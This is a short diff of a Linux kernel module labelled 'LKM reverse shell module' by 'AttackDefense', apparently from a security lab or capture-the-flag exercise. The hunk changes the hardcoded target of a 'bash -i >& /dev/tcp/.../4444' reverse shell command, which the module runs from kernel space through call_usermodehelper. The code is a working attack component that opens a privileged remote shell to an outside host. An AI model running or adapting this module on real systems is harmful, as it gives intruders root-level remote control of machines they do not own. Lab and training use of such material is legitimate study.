@@ -665,7 +665,7 @@ MODULE_AUTHOR("AttackDefense");
 MODULE_DESCRIPTION("LKM reverse shell module");
 MODULE_VERSION("1.0");
 
-char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/172.17.0.2/4444 0>&1", NULL};
+char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
 static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
 
 // call_usermodehelper function is used to create user mode processes from kernel space
